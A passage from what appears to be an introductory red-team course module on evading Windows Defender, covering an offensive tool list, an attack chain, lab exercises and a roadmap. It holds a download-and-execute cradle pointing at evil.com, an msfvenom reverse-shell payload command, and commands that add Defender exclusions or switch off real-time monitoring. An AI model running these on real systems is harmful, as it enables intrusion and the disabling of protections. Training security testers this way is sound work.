- Why: Creates payloads that bypass Defender
- Link: https://github.com/optiv/ScareCrow

NimPackt-v1
- What: Packs .NET into Nim executables
- Why: Nim is less detected than C# by Defender
- Link: https://github.com/chvancooten/NimPackt-v1

SharpCollection
- What: Pre-compiled C# offensive tools
- Why: Ready to use - Rubeus, Seatbelt, SharpHound, etc.
- Link: https://github.com/Flangvik/SharpCollection

Certify / Certipy
- What: Active Directory Certificate Services attack
- Why: Find and abuse misconfigured certificates
- Links: https://github.com/GhostPack/Certify
         https://github.com/ly4k/Certipy

BOF (Beacon Object Files)
- What: Small compiled C programs for C2 agents
- Why: Run in the agent's memory, very stealthy
- Note: Used with Sliver and Cobalt Strike
```

---

## PART 7: UNDERSTANDING THE ATTACK CHAIN

---

### 7.1 - How a Full Attack Works

Before we learn each technique, let's see the big picture.

A real red team attack follows these steps:

```
Step 1: Get Access
        - Phishing email, exploit, or social engineering
        - Get your code running on the target

Step 2: Bypass Defenses
        - Patch AMSI (so your scripts are not scanned)
        - Patch ETW (so your actions are not logged)
        - Unhook EDR (so your API calls are not watched)

Step 3: Run Your Tools
        - Load tools in memory (never touch disk)
        - Use direct syscalls (avoid hooked APIs)
        - Use obfuscated code (avoid string detection)

Step 4: Move Around
        - Find other computers on the network
        - Use stolen credentials to access them
        - Inject into other processes for stealth

Step 5: Get What You Need
        - Find the sensitive data
        - Steal credentials for higher access
        - Reach the target systems

Step 6: Clean Up
        - Remove your tools
        - Clear logs
        - Remove artifacts
        - Make it look like you were never there
```

Each module in this course teaches one or more parts of this chain.


### 7.2 - How This Course Maps to the Attack Chain

```
Module   Topic                        Attack Chain Step
---------------------------------------------------------------------
00       This intro                   Understanding the battlefield
01       AMSI Bypass                  Step 2: Bypass Defenses
02       ETW Patching                 Step 2: Bypass Defenses
03       Process Injection Basics     Step 3: Run Your Tools
04       Process Injection Advanced   Step 3: Run Your Tools
05       Code Obfuscation             Step 3: Run Your Tools
06       Syscalls & Unhooking         Step 2: Bypass Defenses
07       Living off the Land          Step 1-3: Access & Execute
08       Payload Encryption           Step 1: Get Access
09       Advanced Memory              Step 3: Run Your Tools
10       Timestomping & Artifacts     Step 6: Clean Up
11       Process Manipulation         Step 4: Move Around
12       PPL & Kernel                 Step 2: Bypass Defenses
```

---

## PART 8: YOUR FIRST LAB - Testing Defender Detection

---

### 8.1 - Lab Goal

In this lab, you will:
1. Create a simple "malicious" file
2. See Defender detect it
3. Understand WHY it was detected
4. Try basic evasion (and see it fail)
5. Understand why you need the techniques in this course


### 8.2 - Lab Exercise 1: Trigger a Defender Detection

On your Windows 11 VM, open PowerShell and try this:

```powershell
# This is the EICAR test string
# It is not real malware - it is a test string that
# every antivirus is designed to detect

$eicar = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

# Try to save it to a file
$eicar | Out-File -FilePath C:\Users\redteam\Desktop\test.txt

# What happened?
# Defender should have blocked it immediately!
# You will see a notification: "Threat found"
```

Check the Defender notification:
```
1. Click the Defender shield icon in the system tray
2. Click "Virus & threat protection"
3. Click "Protection history"
4. You will see the detection details:
   - Threat name
   - What action was taken
   - The file path that was blocked
```


### 8.3 - Lab Exercise 2: Test AMSI Detection

```powershell
# Try to run a known malicious PowerShell string
# This is harmless text but AMSI flags it

# Try typing this in PowerShell:
"Invoke-Mimikatz"

# That works (it is just a string, not a command)

# Now try:
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/Invoke-Mimikatz.ps1')

# AMSI will catch this!
# You will see an error like:
# "This script contains malicious content and has been blocked"

# Even though the URL does not exist,
# AMSI scans the STRING and finds "Invoke-Mimikatz"
# That string alone triggers AMSI
```


### 8.4 - Lab Exercise 3: Test String Detection

```powershell
# Let's see how string detection works

# This will be caught by AMSI:
$command = "Invoke-Mimikatz"
IEX $command

# Now try basic obfuscation:
$a = "Inv"
$b = "oke-"
$c = "Mim"
$d = "ikatz"
$command = $a + $b + $c + $d
Write-Host "Built string: $command"

# The string was built, but if you try to actually
# run it as a command, AMSI might still catch it
# because AMSI scans the final assembled script block

# This shows you that simple string tricks are not always enough
# You need real AMSI bypass techniques (Module 01)
```


### 8.5 - Lab Exercise 4: Create a Payload and Watch Defender

On your attacker machine (Linux):

```bash
# Generate a simple msfvenom payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o test_payload.exe

# Transfer this file to your Windows VM
# You can use Python HTTP server:
python3 -m http.server 8080

# On the Windows VM, download it:
# Open browser, go to: http://192.168.1.100:8080/test_payload.exe
```

What happens:
```
1. As soon as you try to download, Defender blocks it
2. The file is quarantined before it reaches your disk
3. Check Protection History to see the detection

Detection reason: Defender recognizes the msfvenom payload
The byte pattern matches known Metasploit signatures
```

This is why we need the techniques in this course.
A plain msfvenom payload will NEVER get past Defender.
We need to encrypt, obfuscate, and load it differently.


### 8.6 - Lab Exercise 5: Check What Defender Monitors

```powershell
# See what Defender is currently watching

# List all Defender preferences
Get-MpPreference

# Important settings to look at:
Get-MpPreference | Select-Object DisableRealtimeMonitoring,
    DisableBehaviorMonitoring,
    DisableScriptScanning,
    DisableIOAVProtection

# They should all be False (meaning they are active)

# Check ASR (Attack Surface Reduction) rules
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Actions

# Check exclusions (folders Defender ignores)
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
Get-MpPreference | Select-Object -ExpandProperty ExclusionExtension
Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess
```


### 8.7 - Lab Exercise 6: View Defender Event Logs

```powershell
# Defender logs events in Windows Event Log
# Let's see what it records

# Get recent Defender events
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -MaxEvents 20 |
    Format-Table TimeCreated, Id, Message -AutoSize -Wrap

# Common Event IDs:
# 1006 - Malware detected
# 1007 - Action taken against malware
# 1116 - Defender detected malware or unwanted software
# 1117 - Defender took action against malware
# 5001 - Real-time protection disabled (suspicious!)
# 5004 - Real-time protection config changed

# Look for detection events specifically
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" |
    Where-Object { $_.Id -eq 1116 -or $_.Id -eq 1117 } |
    Select-Object TimeCreated, Message -First 10
```

---

## PART 9: DEFENDER SETTINGS YOU SHOULD KNOW

---

### 9.1 - Key Registry Locations

Defender stores settings in the Windows Registry.

```
Key Defender Registry Paths:

HKLM\SOFTWARE\Microsoft\Windows Defender\
    - Main Defender settings

HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\
    - Real-time scanning settings

HKLM\SOFTWARE\Microsoft\Windows Defender\Features\
    - Feature toggles (Tamper Protection, etc.)

HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\
    - Exclusion lists (paths, processes, extensions)

HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\
    - Group Policy settings for Defender
```

```powershell
# Check Defender registry settings
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"

# Check if Tamper Protection is on
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" |
    Select-Object TamperProtection

# Value 5 means Tamper Protection is ON
# This blocks changes to Defender settings
```


### 9.2 - Defender Exclusions (Important for Lab Work)

When you are TESTING your tools, you might want to add exclusions.
This lets you work without Defender blocking your test files.

IMPORTANT: Only do this in YOUR LAB. Never in production.

```powershell
# Add a folder exclusion (run as Admin)
Add-MpPreference -ExclusionPath "C:\Tools"

# Add a process exclusion
Add-MpPreference -ExclusionProcess "mytool.exe"

# Add a file extension exclusion
Add-MpPreference -ExclusionExtension ".bin"

# Check current exclusions
Get-MpPreference | Select-Object ExclusionPath, ExclusionProcess, ExclusionExtension

# Remove an exclusion
Remove-MpPreference -ExclusionPath "C:\Tools"
```

Note: With Tamper Protection ON, you might not be able to add
exclusions from the command line. Use the Defender UI instead:
```
Settings -> Virus & threat protection -> Manage settings
-> Exclusions -> Add or remove exclusions
```


### 9.3 - Turning Off Defender for Testing

Sometimes you need Defender OFF to test your tools.

```powershell
# Try to disable real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true

# This usually FAILS because of Tamper Protection

# To turn off Tamper Protection:
# 1. Open Windows Security
# 2. Virus & threat protection
# 3. Manage settings
# 4. Turn OFF Tamper Protection
# 5. Now you can disable real-time protection

# After turning off Tamper Protection:
Set-MpPreference -DisableRealtimeMonitoring $true

# To turn it back on:
Set-MpPreference -DisableRealtimeMonitoring $false
```

REMEMBER: Always turn Defender back ON after testing.
You are learning to bypass it, not to turn it off.
Turning it off is cheating and does not teach you anything.

---

## PART 10: WHAT IS COMING NEXT

---

### 10.1 - Course Roadmap

Here is what each upcoming module covers:

```
Module 01A & 01B: AMSI Bypasses
   - Your first real evasion technique
   - Learn to patch AMSI so your scripts run free
   - Multiple methods from simple to advanced
   - Build your own AMSI bypass tool

Module 02: ETW Patching
   - Stop Windows from logging your actions
   - Patch EtwEventWrite in memory
   - Become invisible to event logs

Module 03: Process Injection (Basics)
   - Put your code inside other programs
   - Learn the core APIs: OpenProcess, VirtualAllocEx
   - DLL injection and shellcode injection

Module 04: Process Injection (Advanced)
   - Reflective DLL injection (no files on disk)
   - Process hollowing (hide inside legitimate processes)
   - APC injection (trigger code through thread queues)

Module 05: Code Obfuscation
   - Make your code unreadable to scanners
   - String tricks, encoding, encryption
   - Polymorphic code (code that changes itself)

Module 06: Syscalls and Unhooking
   - Call the Windows kernel directly
   - Skip the hooks that EDR products place
   - Build your own syscall wrappers

Module 07: Living off the Land
   - Use built-in Windows tools for attacks
   - certutil, mshta, bitsadmin, and more
   - No custom tools needed

Module 08: Payload Encryption
   - Encrypt your shellcode so scanners cannot read it
   - AES, XOR, RC4 encryption
   - Build custom shellcode loaders

Module 09: Advanced Memory Techniques
   - Memory permission tricks
   - Code caves and shellcode hiding
   - ROP chains for advanced evasion

Module 10: Timestomping and Artifacts
   - Change file timestamps to hide your tracks
   - Clear event logs
   - Remove evidence of your presence

Module 11: Process Manipulation
   - Spoof parent process IDs
   - Hide command-line arguments
   - Steal and use other process tokens

Module 12: PPL and Kernel Attacks
   - Attack Protected Process Light
   - Use vulnerable drivers (BYOVD)
   - Kernel-level evasion
```


### 10.2 - How to Get the Most From This Course

```
1. DO NOT SKIP LABS
   Reading is not enough. You need to practice.
   Every module has labs. Do all of them.

2. BREAK THINGS
   Your VM is for breaking. That is why we take snapshots.
   If you break it, restore the snapshot and try again.

3. UNDERSTAND THE "WHY"
   Do not just copy-paste code.
   Understand why each technique works.
   This helps you create your own techniques later.

4. TEST AGAINST REAL DEFENDER
   Always test with Defender ON.
   If your technique works with Defender off, it means nothing.

5. KEEP NOTES
   Write down what works and what does not.
   Write down which Defender version you tested against.
   Techniques that work today might be caught tomorrow.

6. STAY UPDATED
   Defender updates its signatures every day.
   Follow security research blogs and Twitter/X.
   New bypass techniques come out regularly.
   Old techniques get caught regularly.
```


### 10.3 - Useful Resources

```
Websites:
- https://lolbas-project.github.io/     (LOLBins database)
- https://loldrivers.io/                 (Vulnerable drivers database)
- https://attack.mitre.org/              (ATT&CK framework)
- https://www.ired.team/                 (Red Team notes)
- https://blog.sevagas.com/              (AV bypass research)

GitHub:
- https://github.com/S3cur3Th1sSh1t     (Offensive tools collection)
- https://github.com/Flangvik            (Sharp collection, Team servers)
- https://github.com/TheWover            (Donut project)
- https://github.com/BishopFox           (Sliver C2)

Blogs to Follow:
- https://blog.xpnsec.com/              (Adam Chester - Windows internals)
- https://offensivedefence.co.uk/        (Offensive/Defensive research)
- https://rastamouse.me/                 (Red Team Ops)
- https://www.trustedsec.com/blog/       (TrustedSec blog)
```

---

## PART 11: SUMMARY AND KEY TAKEAWAYS

---

### 11.1 - What You Learned

In this module you learned:

```
1. Windows Defender has multiple detection layers:
   - Static (file scanning)
   - Dynamic (behavior monitoring)
   - Cloud (AI and machine learning)

2. AMSI checks scripts before they run:
   - PowerShell, .NET, VBScript, VBA
   - Bypassing AMSI is usually the first step

3. ETW logs everything you do:
   - Process creation, API calls, network activity
   - Patching ETW hides your actions from logs

4. Attackers get caught because of:
   - Using known tools without changing them
   - Not bypassing AMSI before running scripts
   - Not cleaning up logs and artifacts
   - Creating suspicious process relationships
   - Writing files to disk

5. Your lab setup:
   - VMware Workstation Pro (free for personal use)
   - Windows 11 VM with Defender active
   - Attacker machine (Linux or Windows)

6. Tools for the course:
   - Sliver C2 and Mythic C2 (modern C2 frameworks)
   - msfvenom (payload generation)
   - SysWhispers (direct syscalls)
   - Donut (shellcode generation)
   - Various PowerShell and C# tools
```


### 11.2 - Before You Continue

Before moving to Module 01 (AMSI Bypasses):

```
Checklist:
[ ] VMware Workstation Pro is installed
[ ] Windows 11 VM is created and updated
[ ] Defender is active and updated on the VM
[ ] You took a clean snapshot of the VM
[ ] You have an attacker machine ready (Kali/Ubuntu/Windows)
[ ] You can transfer files between attacker and target
[ ] You tested Defender detection (EICAR test)
[ ] You understand the three layers of detection
[ ] You know what AMSI and ETW are (at a high level)
```

If all boxes are checked, you are ready for Module 01.

---

## GLOSSARY

---

Here are the key terms from this module:

```
Term                 Meaning
---------------------------------------------------------------
AV                   Antivirus - software that detects malware
AMSI                 Anti-Malware Scan Interface - runtime code scanner
ETW                  Event Tracing for Windows - event logging system
EDR                  Endpoint Detection and Response - advanced security
ASR                  Attack Surface Reduction - extra Defender rules
PPL                  Protected Process Light - process protection
LOLBin               Living off the Land Binary - trusted system tool
C2                   Command and Control - framework to control targets
Shellcode            Small piece of code that does something (usually bad)
Payload              The code you want to run on the target
Beacon               A C2 agent that checks in with the server
Session              A direct connection to a C2 server
Signature            A known pattern that identifies malware
Heuristic            Rules that guess if something is bad
Behavioral           Detection based on what a program does
Tamper Protection    Defender feature that protects itself
Syscall              A direct call to the Windows kernel
Hook                 Code placed by EDR to watch API calls
Unhooking            Removing EDR hooks to avoid detection
Obfuscation          Making code hard to read/detect
Fileless             Attack that never writes files to disk
VM                   Virtual Machine - a computer inside a computer
Snapshot             A saved state of a virtual machine
NAT                  Network Address Translation - VM network type
```

---

## END OF MODULE 00

---

Next: [Module 01A - AMSI Bypasses Part 1](./01_AMSI_BYPASSES_PART1.md)

---

*This course is for authorized security testing and education only.*
*Always get written permission before testing any system.*
*The author is not responsible for misuse of this information.*
